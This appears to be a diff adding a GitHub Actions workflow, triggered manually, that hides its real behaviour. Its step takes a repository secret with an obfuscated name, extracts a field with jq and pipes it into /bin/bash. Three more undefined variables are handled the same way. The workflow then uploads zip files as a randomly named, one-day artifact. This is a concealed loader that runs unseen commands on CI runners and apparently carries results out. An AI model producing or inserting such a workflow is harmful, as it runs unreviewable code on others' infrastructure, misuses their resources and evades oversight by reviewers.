@@ -1,0 +1,32 @@
+name: Pipeline
+on:
+  workflow_dispatch:
+
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  handler:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Launch
+        env:
+          uxwyg8678: ${{ secrets.uxwyg8678 }}
+        run: |
+          printf '%s' "$uxwyg8678" | jq -r .s132 | /bin/bash
+          printf '%s' "$na56" | jq -r .cxxk707 | /bin/bash
+          echo $sp9396 | jq -r .koc8 | /bin/bash
+          echo $d175 | jq -r .je62 | /bin/bash
+
+      - name: Persist output
+        uses: actions/upload-artifact@v4
+        with:
+          name: z6pFsCdj
+          path: "*.zip"
+          retention-days: 1
